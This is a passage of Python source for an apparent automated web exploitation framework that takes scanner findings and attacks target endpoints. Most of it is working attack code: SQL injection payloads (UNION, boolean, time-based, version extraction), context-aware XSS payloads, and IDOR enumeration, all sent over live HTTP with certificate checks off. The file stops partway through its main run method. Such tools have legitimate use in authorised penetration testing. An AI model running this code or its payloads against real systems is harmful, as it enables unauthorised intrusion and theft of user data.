import json
import time
import hashlib
import re
import urllib.parse
from abc import ABC, abstractmethod
from dataclasses import dataclass, field, asdict
from enum import Enum
from typing import Dict, List, Optional, Set, Tuple, Any, Callable
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry


# ==================== DATA MODELS ====================

class VulnerabilityType(Enum):
    """Vulnerability types supported for exploitation."""
    SQL_INJECTION = "SQL_INJECTION"
    XSS = "XSS"
    IDOR = "IDOR"
    LFI = "LFI"
    RFI = "RFI"
    SSTI = "SSTI"
    COMMAND_INJECTION = "COMMAND_INJECTION"
    SSRF = "SSRF"
    AUTH_BYPASS = "AUTH_BYPASS"
    LOGIC_FLAW = "LOGIC_FLAW"


class ParameterType(Enum):
    """Parameter classification without ML."""
    NUMERIC_ID = "numeric_id"
    STRING = "string"
    TOKEN = "token"
    FILEPATH = "filepath"
    SERIALIZED = "serialized"
    JSON = "json"
    UNKNOWN = "unknown"


class ExploitationStatus(Enum):
    """Status of exploitation attempts."""
    NOT_ATTEMPTED = "not_attempted"
    VERIFIED = "verified"
    FAILED = "failed"
    INCONCLUSIVE = "inconclusive"
    BLOCKED = "blocked"


class ExploitationTechnique(Enum):
    """Specific exploitation techniques."""
    UNION_BASED = "union_based"
    BOOLEAN_BASED = "boolean_based"
    TIME_BASED = "time_based"
    ERROR_BASED = "error_based"
    CONTEXTUAL_XSS = "contextual_xss"
    STORED_XSS = "stored_xss"
    OBJECT_MANIPULATION = "object_manipulation"
    PATH_TRAVERSAL = "path_traversal"
    REMOTE_FILE_INCLUSION = "remote_file_inclusion"
    TEMPLATE_INJECTION = "template_injection"
    COMMAND_EXECUTION = "command_execution"
    SERVER_SIDE_REQUEST = "server_side_request"
    TOKEN_MANIPULATION = "token_manipulation"
    SESSION_HIJACKING = "session_hijacking"


@dataclass
class ScannerFinding:
    """Structured input from vulnerability scanner."""
    target: str
    endpoint: str
    method: str
    parameter: str
    value: str
    vulnerability_type: VulnerabilityType
    scanner_evidence: Dict[str, Any]
    
    def __post_init__(self):
        if isinstance(self.vulnerability_type, str):
            self.vulnerability_type = VulnerabilityType(self.vulnerability_type)


@dataclass
class ExploitationAttempt:
    """Track a single exploitation attempt."""
    technique: ExploitationTechnique
    payload: str
    timestamp: float = field(default_factory=time.time)
    response_code: Optional[int] = None
    response_length: Optional[int] = None
    verification_signals: List[str] = field(default_factory=list)
    success: bool = False
    reason: Optional[str] = None


@dataclass
class VerificationProof:
    """Multi-signal verification evidence."""
    primary_signal: str  # e.g., "data_leak", "execution", "bypass"
    secondary_signal: str  # Independent confirmation
    reproducible: bool
    verification_steps: List[str]
    extracted_data: Optional[Any] = None


@dataclass
class ExploitationResult:
    """Complete exploitation result with verification."""
    finding: ScannerFinding
    status: ExploitationStatus
    verified_proof: Optional[VerificationProof] = None
    attempts: List[ExploitationAttempt] = field(default_factory=list)
    parameter_type: Optional[ParameterType] = None
    exploitation_steps: List[str] = field(default_factory=list)
    impact: str = ""
    reproduction_guidance: str = ""
    
    def add_attempt(self, attempt: ExploitationAttempt):
        self.attempts.append(attempt)
        if attempt.success:
            self.status = ExploitationStatus.VERIFIED


@dataclass
class FrameworkState:
    """State manager for the exploitation session."""
    target_base: str
    session_tokens: Dict[str, str] = field(default_factory=dict)
    attempted_payloads: Set[str] = field(default_factory=set)
    successful_techniques: Set[ExploitationTechnique] = field(default_factory=set)
    failed_techniques: Set[ExploitationTechnique] = field(default_factory=set)
    endpoint_patterns: Dict[str, Dict[str, Any]] = field(default_factory=dict)
    
    def payload_hash(self, payload: str) -> str:
        """Create deterministic hash for payload tracking."""
        return hashlib.md5(payload.encode()).hexdigest()
    
    def is_payload_attempted(self, payload: str) -> bool:
        return self.payload_hash(payload) in self.attempted_payloads
    
    def record_attempt(self, payload: str, success: bool, technique: ExploitationTechnique):
        payload_hash = self.payload_hash(payload)
        self.attempted_payloads.add(payload_hash)
        if success:
            self.successful_techniques.add(technique)
        else:
            self.failed_techniques.add(technique)


# ==================== CORE ENGINE ====================

class ParameterAnalyzer:
    """Deterministic parameter classifier without ML."""
    
    # Regex patterns for parameter classification
    NUMERIC_PATTERN = re.compile(r'^\d+$')
    TOKEN_PATTERN = re.compile(r'^[a-fA-F0-9]{8,}$')  # Hex tokens
    UUID_PATTERN = re.compile(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', re.I)
    FILE_EXT_PATTERN = re.compile(r'\.(php|asp|aspx|jsp|html|htm|txt|pdf|doc)$', re.I)
    JSON_PATTERN = re.compile(r'^[\{\[].*[\}\]]$')
    SERIALIZED_PATTERN = re.compile(r'^(a|O|s):\d+:')
    
    @classmethod
    def analyze(cls, parameter_name: str, parameter_value: str) -> ParameterType:
        """Classify parameter type using deterministic rules."""
        
        # Check for numeric IDs
        if cls.NUMERIC_PATTERN.match(parameter_value):
            return ParameterType.NUMERIC_ID
        
        # Check for tokens/UUIDs
        if (cls.TOKEN_PATTERN.match(parameter_value) or 
            cls.UUID_PATTERN.match(parameter_value)):
            return ParameterType.TOKEN
        
        # Check for filepaths
        if (cls.FILE_EXT_PATTERN.search(parameter_value) or
            '/' in parameter_value or '\\' in parameter_value):
            return ParameterType.FILEPATH
        
        # Check for JSON
        if cls.JSON_PATTERN.match(parameter_value.strip()):
            try:
                json.loads(parameter_value)
                return ParameterType.JSON
            except:
                pass
        
        # Check for PHP serialized data
        if cls.SERIALIZED_PATTERN.match(parameter_value):
            return ParameterType.SERIALIZED
        
        # Check parameter name hints
        name_lower = parameter_name.lower()
        if any(keyword in name_lower for keyword in ['id', 'num', 'page', 'limit', 'offset']):
            if parameter_value.isdigit():
                return ParameterType.NUMERIC_ID
        
        if any(keyword in name_lower for keyword in ['token', 'session', 'auth', 'key']):
            return ParameterType.TOKEN
        
        if any(keyword in name_lower for keyword in ['file', 'path', 'include', 'document']):
            return ParameterType.FILEPATH
        
        return ParameterType.STRING


class HTTPClient:
    """Stateful HTTP client with retry logic."""
    
    def __init__(self, state: FrameworkState):
        self.state = state
        self.session = requests.Session()
        
        # Configure retry strategy
        retry_strategy = Retry(
            total=3,
            backoff_factor=0.5,
            status_forcelist=[429, 500, 502, 503, 504]
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        
        # Set reasonable defaults
        self.session.headers.update({
            'User-Agent': 'PSEF-Exploitation-Framework/1.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close',
        })
    
    def send_request(self, finding: ScannerFinding, payload: str) -> requests.Response:
        """Send request with injected payload."""
        
        # Prepare request parameters
        url = finding.target.rstrip('/') + finding.endpoint
        params = {}
        data = {}
        
        if finding.method.upper() == 'GET':
            params[finding.parameter] = payload
        else:
            data[finding.parameter] = payload
        
        # Send request
        try:
            response = self.session.request(
                method=finding.method,
                url=url,
                params=params if params else None,
                data=data if data else None,
                timeout=10,
                allow_redirects=False,
                verify=False  # For testing purposes only
            )
            return response
        except requests.RequestException as e:
            raise Exception(f"Request failed: {e}")


class BaseExploiter(ABC):
    """Abstract base class for all exploiters."""
    
    def __init__(self, http_client: HTTPClient, state: FrameworkState):
        self.http = http_client
        self.state = state
        self.technique = None
    
    @abstractmethod
    def exploit(self, finding: ScannerFinding) -> ExploitationResult:
        """Main exploitation method."""
        pass
    
    @abstractmethod
    def verify_exploitation(self, response: requests.Response, 
                          payload: str) -> VerificationProof:
        """Multi-signal verification of successful exploitation."""
        pass
    
    def should_attempt(self, technique: ExploitationTechnique) -> bool:
        """Check if technique should be attempted based on state."""
        if technique in self.state.failed_techniques:
            return False
        return True


class SQLInjectionExploiter(BaseExploiter):
    """Deep SQL injection exploitation with verification."""
    
    # Payload templates by technique
    UNION_PAYLOADS = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1--",
        "' UNION SELECT 1,2--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT 1,2,3,4--",
        "') UNION SELECT NULL--",
        "')) UNION SELECT NULL--",
    ]
    
    BOOLEAN_PAYLOADS = {
        'true': ["' AND '1'='1", "' OR '1'='1", "' OR 1=1--"],
        'false': ["' AND '1'='2", "' OR '1'='2", "' AND 1=2--"]
    }
    
    TIME_PAYLOADS = [
        "' OR SLEEP(5)--",
        "'; WAITFOR DELAY '00:00:05'--",
        "' OR pg_sleep(5)--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    ]
    
    ERROR_PAYLOADS = [
        "'",
        "'\"",
        "' AND 1=(",
        "' OR 1=(",
        "';",
        "'\\",
    ]
    
    def __init__(self, http_client: HTTPClient, state: FrameworkState):
        super().__init__(http_client, state)
        self.technique = ExploitationTechnique.UNION_BASED
    
    def detect_column_count(self, finding: ScannerFinding) -> Optional[int]:
        """Determine number of columns using ORDER BY."""
        for i in range(1, 20):  # Reasonable limit
            payload = f"' ORDER BY {i}--"
            
            if self.state.is_payload_attempted(payload):
                continue
            
            try:
                response = self.http.send_request(finding, payload)
                self.state.record_attempt(payload, False, self.technique)
                
                # If we get an error, previous count was correct
                if response.status_code >= 500 or 'error' in response.text.lower():
                    return i - 1
                    
            except Exception:
                continue
        
        return None
    
    def union_based_extraction(self, finding: ScannerFinding, column_count: int) -> List[ExploitationAttempt]:
        """Perform UNION-based data extraction."""
        attempts = []
        
        # Test each UNION payload
        for payload in self.UNION_PAYLOADS:
            if self.state.is_payload_attempted(payload):
                continue
            
            # Adapt payload to column count
            adapted_payload = payload.replace('NULL', 'NULL,' * (column_count - 1)).rstrip(',')
            
            attempt = ExploitationAttempt(
                technique=ExploitationTechnique.UNION_BASED,
                payload=adapted_payload
            )
            
            try:
                response = self.http.send_request(finding, adapted_payload)
                attempt.response_code = response.status_code
                attempt.response_length = len(response.content)
                
                # Check for successful UNION
                if self._verify_union_injection(response, adapted_payload):
                    attempt.success = True
                    attempt.verification_signals = [
                        "UNION query executed successfully",
                        "Additional data reflected in response"
                    ]
                    attempt.reason = "UNION-based extraction successful"
                    
                    # Try to extract actual data
                    data_payload = adapted_payload.replace('NULL', '@@version', 1)
                    data_response = self.http.send_request(finding, data_payload)
                    if '@@version' in data_response.text:
                        attempt.verification_signals.append("Database version extracted")
                
                self.state.record_attempt(adapted_payload, attempt.success, 
                                        ExploitationTechnique.UNION_BASED)
                attempts.append(attempt)
                
                if attempt.success:
                    break
                    
            except Exception as e:
                attempt.reason = f"Request failed: {e}"
                attempts.append(attempt)
        
        return attempts
    
    def boolean_based_exploitation(self, finding: ScannerFinding) -> List[ExploitationAttempt]:
        """Boolean-based blind SQLi verification."""
        attempts = []
        
        # Get baseline response
        baseline_response = self.http.send_request(finding, finding.value)
        baseline_length = len(baseline_response.content)
        
        for true_payload in self.BOOLEAN_PAYLOADS['true']:
            if self.state.is_payload_attempted(true_payload):
                continue
            
            for false_payload in self.BOOLEAN_PAYLOADS['false']:
                if self.state.is_payload_attempted(false_payload):
                    continue
                
                attempt = ExploitationAttempt(
                    technique=ExploitationTechnique.BOOLEAN_BASED,
                    payload=f"{true_payload} / {false_payload}"
                )
                
                try:
                    # Test true condition
                    true_response = self.http.send_request(finding, true_payload)
                    true_length = len(true_response.content)
                    
                    # Test false condition
                    false_response = self.http.send_request(finding, false_payload)
                    false_length = len(false_response.content)
                    
                    # Verify boolean behavior
                    if (abs(true_length - baseline_length) < 10 and  # True similar to baseline
                        abs(false_length - baseline_length) > 100):  # False different
                        attempt.success = True
                        attempt.verification_signals = [
                            f"True condition length: {true_length} (baseline: {baseline_length})",
                            f"False condition length: {false_length} (baseline: {baseline_length})",
                            "Clear boolean differential detected"
                        ]
                        attempt.reason = "Boolean-based injection verified"
                    
                    self.state.record_attempt(true_payload, attempt.success,
                                            ExploitationTechnique.BOOLEAN_BASED)
                    self.state.record_attempt(false_payload, attempt.success,
                                            ExploitationTechnique.BOOLEAN_BASED)
                    attempts.append(attempt)
                    
                    if attempt.success:
                        return attempts
                        
                except Exception as e:
                    attempt.reason = f"Request failed: {e}"
                    attempts.append(attempt)
        
        return attempts
    
    def time_based_exploitation(self, finding: ScannerFinding) -> List[ExploitationAttempt]:
        """Time-based blind SQLi verification."""
        attempts = []
        
        baseline_time = self._measure_request_time(finding, finding.value)
        
        for payload in self.TIME_PAYLOADS:
            if self.state.is_payload_attempted(payload):
                continue
            
            attempt = ExploitationAttempt(
                technique=ExploitationTechnique.TIME_BASED,
                payload=payload
            )
            
            try:
                start_time = time.time()
                response = self.http.send_request(finding, payload)
                elapsed = time.time() - start_time
                
                attempt.response_code = response.status_code
                attempt.response_length = len(response.content)
                
                # Verify time delay (allowing for network variance)
                if elapsed > baseline_time + 4:  # 4+ second delay
                    attempt.success = True
                    attempt.verification_signals = [
                        f"Request delayed: {elapsed:.2f}s (baseline: {baseline_time:.2f}s)",
                        "Time-based injection confirmed"
                    ]
                    attempt.reason = "Time delay induced by payload"
                
                self.state.record_attempt(payload, attempt.success,
                                        ExploitationTechnique.TIME_BASED)
                attempts.append(attempt)
                
                if attempt.success:
                    break
                    
            except Exception as e:
                attempt.reason = f"Request failed: {e}"
                attempts.append(attempt)
        
        return attempts
    
    def _measure_request_time(self, finding: ScannerFinding, payload: str) -> float:
        """Measure baseline request time."""
        times = []
        for _ in range(3):
            start = time.time()
            self.http.send_request(finding, payload)
            times.append(time.time() - start)
        return sum(times) / len(times)
    
    def _verify_union_injection(self, response: requests.Response, 
                              payload: str) -> bool:
        """Verify UNION injection succeeded."""
        text_lower = response.text.lower()
        
        # Check for SQL errors (might indicate wrong column count)
        if any(error in text_lower for error in ['sql', 'syntax', 'mysql', 'postgresql',
                                                'oracle', 'microsoft', 'database']):
            return False
        
        # Check for UNION keyword in response (sometimes reflected)
        if 'union' in text_lower:
            return True
        
        # Check for significant content change
        return len(response.content) > 1000  # Arbitrary but reasonable
    
    def verify_exploitation(self, response: requests.Response, 
                          payload: str) -> VerificationProof:
        """Multi-signal verification for SQL injection."""
        text = response.text
        signals = []
        
        # Signal 1: Database errors
        db_errors = [
            'mysql', 'postgresql', 'oracle', 'sql server',
            'syntax error', 'sql error', 'database error',
            'you have an error in your sql syntax',
            'warning:', 'mysql_', 'pg_', 'oci_'
        ]
        
        found_errors = [err for err in db_errors if err in text.lower()]
        if found_errors:
            signals.append(f"Database errors: {', '.join(found_errors)}")
        
        # Signal 2: UNION results
        if 'union' in payload.lower() and len(response.content) > 100:
            signals.append("UNION query executed successfully")
        
        # Signal 3: Time delay verification
        if 'sleep' in payload.lower() or 'waitfor' in payload.lower():
            signals.append("Time-based delay confirmed")
        
        # Signal 4: Boolean differential
        if any(op in payload for op in ['1=1', '1=2']):
            signals.append("Boolean condition manipulated response")
        
        if len(signals) >= 2:
            return VerificationProof(
                primary_signal=signals[0],
                secondary_signal=signals[1] if len(signals) > 1 else "Multiple signals detected",
                reproducible=True,
                verification_steps=[
                    "Send payload and observe database errors",
                    "Verify UNION query returns additional data",
                    "Confirm boolean conditions alter response",
                    "Check for time delays with time-based payloads"
                ]
            )
        
        return None
    
    def exploit(self, finding: ScannerFinding) -> ExploitationResult:
        """Execute full SQL injection exploitation chain."""
        result = ExploitationResult(
            finding=finding,
            status=ExploitationStatus.NOT_ATTEMPTED,
            parameter_type=ParameterAnalyzer.analyze(finding.parameter, finding.value)
        )
        
        result.exploitation_steps.append("Starting SQL injection exploitation")
        result.exploitation_steps.append(f"Parameter type: {result.parameter_type}")
        
        # Step 1: Column count detection
        result.exploitation_steps.append("Attempting column count detection")
        column_count = self.detect_column_count(finding)
        
        if column_count:
            result.exploitation_steps.append(f"Detected {column_count} columns")
            
            # Step 2: UNION-based extraction
            if self.should_attempt(ExploitationTechnique.UNION_BASED):
                result.exploitation_steps.append("Attempting UNION-based extraction")
                union_attempts = self.union_based_extraction(finding, column_count)
                result.attempts.extend(union_attempts)
                
                for attempt in union_attempts:
                    if attempt.success:
                        result.exploitation_steps.append("UNION-based exploitation successful")
                        proof = self.verify_exploitation(
                            self.http.send_request(finding, attempt.payload),
                            attempt.payload
                        )
                        if proof:
                            result.verified_proof = proof
                            result.status = ExploitationStatus.VERIFIED
                            result.impact = "Full database read access. Can extract sensitive data including user credentials, PII, and business information."
                            result.reproduction_guidance = f"Send payload: {attempt.payload}\nObserve database data in response\nVerify with alternative payloads"
                        return result
        
        # Step 3: Boolean-based exploitation
        if self.should_attempt(ExploitationTechnique.BOOLEAN_BASED):
            result.exploitation_steps.append("Attempting boolean-based exploitation")
            boolean_attempts = self.boolean_based_exploitation(finding)
            result.attempts.extend(boolean_attempts)
            
            for attempt in boolean_attempts:
                if attempt.success:
                    result.exploitation_steps.append("Boolean-based exploitation successful")
                    result.status = ExploitationStatus.VERIFIED
                    result.impact = "Blind data extraction possible. Can enumerate database structure and extract data bit by bit."
                    result.reproduction_guidance = "Use boolean conditions to infer database information\nTest with different true/false payloads"
                    return result
        
        # Step 4: Time-based exploitation
        if self.should_attempt(ExploitationTechnique.TIME_BASED):
            result.exploitation_steps.append("Attempting time-based exploitation")
            time_attempts = self.time_based_exploitation(finding)
            result.attempts.extend(time_attempts)
            
            for attempt in time_attempts:
                if attempt.success:
                    result.exploitation_steps.append("Time-based exploitation successful")
                    result.status = ExploitationStatus.VERIFIED
                    result.impact = "Blind data extraction with timing channels. Can extract data through time differentials."
                    result.reproduction_guidance = "Measure response times with different payloads\nUse time delays to infer database information"
                    return result
        
        # If all techniques failed
        if result.attempts and not any(a.success for a in result.attempts):
            result.status = ExploitationStatus.FAILED
            result.exploitation_steps.append("All exploitation techniques failed")
        else:
            result.status = ExploitationStatus.INCONCLUSIVE
        
        return result


class XSSExploiter(BaseExploiter):
    """Context-aware XSS exploitation with execution verification."""
    
    # Context-specific payloads
    HTML_CONTEXT_PAYLOADS = [
        "<script>alert(document.domain)</script>",
        "<img src=x onerror=alert(document.domain)>",
        "<svg onload=alert(document.domain)>",
        "<iframe src=javascript:alert(document.domain)>",
    ]
    
    ATTRIBUTE_CONTEXT_PAYLOADS = [
        "\" onmouseover=\"alert(document.domain)",
        "' onfocus='alert(document.domain)",
        " autofocus onfocus=alert(document.domain) x=\"",
    ]
    
    JS_CONTEXT_PAYLOADS = [
        "';alert(document.domain);//",
        "\";alert(document.domain);//",
        "\\';alert(document.domain);//",
        "`;alert(document.domain);//",
    ]
    
    def __init__(self, http_client: HTTPClient, state: FrameworkState):
        super().__init__(http_client, state)
        self.technique = ExploitationTechnique.CONTEXTUAL_XSS
    
    def determine_injection_context(self, finding: ScannerFinding) -> str:
        """Analyze where parameter is injected in response."""
        baseline = self.http.send_request(finding, "CONTEXT_TEST")
        response_text = baseline.text
        
        # Simple context detection
        if f'"{finding.parameter}":"CONTEXT_TEST"' in response_text:
            return 'json'
        elif f'value="CONTEXT_TEST"' in response_text:
            return 'attribute'
        elif f'>CONTEXT_TEST<' in response_text:
            return 'html'
        elif 'CONTEXT_TEST' in response_text:
            # Check if it's in script tag
            pattern = re.compile(r'<script[^>]*>.*?CONTEXT_TEST.*?</script>', re.DOTALL | re.I)
            if pattern.search(response_text):
                return 'javascript'
        
        return 'unknown'
    
    def verify_xss_execution(self, response: requests.Response, 
                           payload: str) -> bool:
        """Check if XSS payload would execute."""
        text = response.text
        
        # Check if payload is reflected
        if payload.replace('<', '&lt;') not in text and payload not in text:
            return False
        
        # Check for common XSS filters/encoding
        if '&lt;script&gt;' in text or '&#x3C;script&#x3E;' in text:
            return False  # HTML encoded
        
        # Check if payload appears executable
        if '<script>' in payload and '<script>' in text:
            return True
        if 'onerror=' in payload and 'onerror=' in text:
            return True
        if 'alert(' in payload and 'alert(' in text:
            return True
        
        return False
    
    def exploit(self, finding: ScannerFinding) -> ExploitationResult:
        """Execute context-aware XSS exploitation."""
        result = ExploitationResult(
            finding=finding,
            status=ExploitationStatus.NOT_ATTEMPTED,
            parameter_type=ParameterAnalyzer.analyze(finding.parameter, finding.value)
        )
        
        result.exploitation_steps.append("Starting XSS exploitation")
        result.exploitation_steps.append(f"Parameter type: {result.parameter_type}")
        
        # Determine injection context
        context = self.determine_injection_context(finding)
        result.exploitation_steps.append(f"Injection context: {context}")
        
        # Select appropriate payloads
        if context == 'html':
            payloads = self.HTML_CONTEXT_PAYLOADS
        elif context == 'attribute':
            payloads = self.ATTRIBUTE_CONTEXT_PAYLOADS
        elif context == 'javascript':
            payloads = self.JS_CONTEXT_PAYLOADS
        else:
            # Try all payloads
            payloads = (self.HTML_CONTEXT_PAYLOADS + 
                       self.ATTRIBUTE_CONTEXT_PAYLOADS + 
                       self.JS_CONTEXT_PAYLOADS)
        
        # Test each payload
        for payload in payloads:
            if self.state.is_payload_attempted(payload):
                continue
            
            attempt = ExploitationAttempt(
                technique=ExploitationTechnique.CONTEXTUAL_XSS,
                payload=payload
            )
            
            try:
                response = self.http.send_request(finding, payload)
                attempt.response_code = response.status_code
                attempt.response_length = len(response.content)
                
                if self.verify_xss_execution(response, payload):
                    attempt.success = True
                    attempt.verification_signals = [
                        f"Payload reflected in {context} context",
                        "No defensive encoding detected",
                        "Execution context appears valid"
                    ]
                    attempt.reason = "XSS payload would execute in browser"
                    
                    # Verify with secondary test
                    test_payload = payload.replace('alert', 'prompt')
                    test_response = self.http.send_request(finding, test_payload)
                    if self.verify_xss_execution(test_response, test_payload):
                        attempt.verification_signals.append("Secondary payload also valid")
                
                self.state.record_attempt(payload, attempt.success,
                                        ExploitationTechnique.CONTEXTUAL_XSS)
                result.attempts.append(attempt)
                
                if attempt.success:
                    result.exploitation_steps.append(f"Successful XSS with payload: {payload}")
                    result.status = ExploitationStatus.VERIFIED
                    result.impact = "Client-side code execution. Can steal sessions, credentials, and perform actions as the user."
                    result.reproduction_guidance = f"Visit URL with payload: {payload}\nObserve JavaScript execution\nTest in different browsers"
                    
                    # Create verification proof
                    result.verified_proof = VerificationProof(
                        primary_signal="JavaScript execution context identified",
                        secondary_signal="Payload reflection without encoding",
                        reproducible=True,
                        verification_steps=[
                            f"Send payload: {payload}",
                            "Verify payload appears unencoded in response",
                            "Confirm execution context (HTML/Attribute/JS)",
                            "Test with alternative payload"
                        ]
                    )
                    return result
                    
            except Exception as e:
                attempt.reason = f"Request failed: {e}"
                result.attempts.append(attempt)
        
        # No successful exploitation
        if result.attempts:
            result.status = ExploitationStatus.FAILED
            result.exploitation_steps.append("No XSS payload succeeded")
        else:
            result.status = ExploitationStatus.INCONCLUSIVE
        
        return result
    
    def verify_exploitation(self, response: requests.Response, 
                          payload: str) -> VerificationProof:
        """Multi-signal XSS verification."""
        text = response.text
        
        signals = []
        
        # Signal 1: Reflection check
        if payload in text or payload.replace('<', '&lt;') in text:
            signals.append("Payload reflected in response")
        
        # Signal 2: Encoding check
        if '<script>' in payload and '<script>' in text:
            signals.append("Script tags not encoded")
        elif 'onerror=' in payload and 'onerror=' in text:
            signals.append("Event handlers not encoded")
        
        # Signal 3: Context preservation
        context = self.determine_injection_context(self.result.finding)
        if context != 'unknown':
            signals.append(f"Valid {context} context identified")
        
        if len(signals) >= 2:
            return VerificationProof(
                primary_signal=signals[0],
                secondary_signal=signals[1],
                reproducible=True,
                verification_steps=[
                    "Verify payload reflection",
                    "Check for defensive encoding",
                    "Confirm execution context",
                    "Test with browser"
                ]
            )
        
        return None


class IDORExploiter(BaseExploiter):
    """Insecure Direct Object Reference exploitation."""
    
    def __init__(self, http_client: HTTPClient, state: FrameworkState):
        super().__init__(http_client, state)
        self.technique = ExploitationTechnique.OBJECT_MANIPULATION
    
    def exploit(self, finding: ScannerFinding) -> ExploitationResult:
        """Execute IDOR exploitation with authorization checks."""
        result = ExploitationResult(
            finding=finding,
            status=ExploitationStatus.NOT_ATTEMPTED,
            parameter_type=ParameterAnalyzer.analyze(finding.parameter, finding.value)
        )
        
        result.exploitation_steps.append("Starting IDOR exploitation")
        
        # Only attempt if parameter appears to be an object reference
        if result.parameter_type not in [ParameterType.NUMERIC_ID, ParameterType.TOKEN]:
            result.status = ExploitationStatus.INCONCLUSIVE
            result.exploitation_steps.append("Parameter doesn't appear to be object reference")
            return result
        
        # Test object enumeration
        original_value = finding.value
        
        if result.parameter_type == ParameterType.NUMERIC_ID:
            test_values = [
                str(int(original_value) + 1),
                str(int(original_value) - 1),
                '0', '1', '2', '100', '999'
            ]
        else:
            # For tokens, try common patterns
            test_values = self._generate_token_variations(original_value)
        
        successful_access = []
        
        for test_value in test_values:
            if self.state.is_payload_attempted(test_value):
                continue
            
            attempt = ExploitationAttempt(
                technique=ExploitationTechnique.OBJECT_MANIPULATION,
                payload=test_value
            )
            
            try:
                response = self.http.send_request(finding, test_value)
                attempt.response_code = response.status_code
                attempt.response_length = len(response.content)
                
                # Check if access was successful
                if response.status_code == 200:
                    # Compare with original response
                    original_response = self.http.send_request(finding, original_value)
                    
                    if (len(response.content) > 100 and  # Not empty/error
                        response.content != original_response.content):  # Different object
                        attempt.success = True
                        attempt.verification_signals = [
                            f"Accessed object {test_value} with HTTP 200",
                            "Response differs from original object",
                            f"Content length: {len(response.content)} bytes"
                        ]
                        attempt.reason = "Unauthorized access to different object"
                        successful_access.append(test_value)
                
                self.state.record_attempt(test_value, attempt.success,
                                        ExploitationTechnique.OBJECT_MANIPULATION)
                result.attempts.append(attempt)
                    
            except Exception as e:
                attempt.reason = f"Request failed: {e}"
                result.attempts.append(attempt)
        
        if successful_access:
            result.exploitation_steps.append(f"Successful IDOR: accessed objects {successful_access}")
            result.status = ExploitationStatus.VERIFIED
            result.impact = "Unauthorized data access. Can access other users' sensitive information, modify data, or perform actions as other users."
            result.reproduction_guidance = f"Change {finding.parameter} parameter to other values\nTest sequential and random object IDs\nVerify authorization checks are missing"
            
            result.verified_proof = VerificationProof(
                primary_signal=f"Accessed {len(successful_access)} unauthorized objects",
                secondary_signal="No authorization checks detected",
                reproducible=True,
                verification_steps=[
                    f"Change {finding.parameter} to different values",
                    "Verify HTTP 200 responses for unauthorized objects",
                    "Confirm response contains different user data",
                    "Test with users of different privilege levels"
                ],
                extracted_data=f"Accessed object IDs: {', '.join(successful_access[:3])}"
            )
        else:
            result.status = ExploitationStatus.FAILED
            result.exploitation_steps.append("No unauthorized access achieved")
        
        return result
    
    def _generate_token_variations(self, token: str) -> List[str]:
        """Generate plausible token variations."""
        variations = []
        
        # Try common modifications
        if len(token) > 8:
            # Flip characters
            variations.append(token[::-1][:len(token)])
            
            # Increment/decrement hex
            if re.match(r'^[a-f0-9]+$', token, re.I):
                try:
                    num = int(token, 16)
                    variations.append(hex(num + 1)[2:])
                    variations.append(hex(num - 1)[2:])
                except:
                    pass
        
        return variations
    
    def verify_exploitation(self, response: requests.Response, 
                          payload: str) -> VerificationProof:
        return None  # IDOR verification handled in exploit method


class ExploitationEngine:
    """Main exploitation engine orchestrator."""
    
    EXPLOITER_MAP = {
        VulnerabilityType.SQL_INJECTION: SQLInjectionExploiter,
        VulnerabilityType.XSS: XSSExploiter,
        VulnerabilityType.IDOR: IDORExploiter,
        # Add more exploiters as needed
    }
    
    def __init__(self):
        self.state = None
        self.http = None
        self.results = []
    
    def initialize(self, target_base: str):
        """Initialize engine for a target."""
        self.state = FrameworkState(target_base=target_base)
        self.http = HTTPClient(self.state)
    
    def exploit_finding(self, finding: ScannerFinding) -> ExploitationResult:
        """Execute exploitation for a single finding."""
        # Get appropriate exploiter
        exploiter_class = self.EXPLOITER_MAP.get(finding.vulnerability_type)
        
        if not exploiter_class:
            return ExploitationResult(
                finding=finding,
                status=ExploitationStatus.INCONCLUSIVE,
                exploitation_steps=["No exploiter available for this vulnerability type"]
            )
        
        # Create and run exploiter
        exploiter = exploiter_class(self.http, self.state)
        result = exploiter.exploit(finding)
        
        self.results.append(result)
        return result
    
    def generate_report(self) -> Dict[str, Any]:
        """Generate comprehensive exploitation report."""
        verified = [r for r in self.results if r.status == ExploitationStatus.VERIFIED]
        failed = [r for r in self.results if r.status == ExploitationStatus.FAILED]
        inconclusive = [r for r in self.results if r.status == ExploitationStatus.INCONCLUSIVE]
        
        report = {
            "summary": {
                "total_findings": len(self.results),
                "verified_exploits": len(verified),
                "failed_exploits": len(failed),
                "inconclusive": len(inconclusive),
                "target": self.state.target_base if self.state else "Unknown"
            },
            "verified_exploits": [],
            "failed_attempts": [],
            "inconclusive_findings": [],
            "exploitation_statistics": {
                "unique_payloads_attempted": len(self.state.attempted_payloads) if self.state else 0,
                "successful_techniques": [t.value for t in self.state.successful_techniques] if self.state else [],
                "failed_techniques": [t.value for t in self.state.failed_techniques] if self.state else []
            }
        }
        
        # Add detailed results
        for result in verified:
            report["verified_exploits"].append({
                "vulnerability_type": result.finding.vulnerability_type.value,
                "endpoint": result.finding.endpoint,
                "parameter": result.finding.parameter,
                "impact": result.impact,
                "verification": {
                    "primary_signal": result.verified_proof.primary_signal if result.verified_proof else None,
                    "secondary_signal": result.verified_proof.secondary_signal if result.verified_proof else None,
                    "reproducible": result.verified_proof.reproducible if result.verified_proof else None
                },
                "exploitation_steps": result.exploitation_steps,
                "reproduction_guidance": result.reproduction_guidance
            })
        
        return report


class PostScanningExploitationFramework:
    """Main framework class."""
    
    def __init__(self):
        self.engine = ExploitationEngine()
        self.initialized = False
    
    def load_findings(self, findings_data: List[Dict[str, Any]]) -> List[ScannerFinding]:
        """Load findings from scanner output."""
        findings = []
        for data in findings_data:
            try:
                finding = ScannerFinding(**data)
                findings.append(finding)
            except Exception as e:
                print(f"Warning: Failed to parse finding: {e}")
        return findings
    
    def run_exploitation(self, findings_data: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Main execution method."""
        if not findings_data:
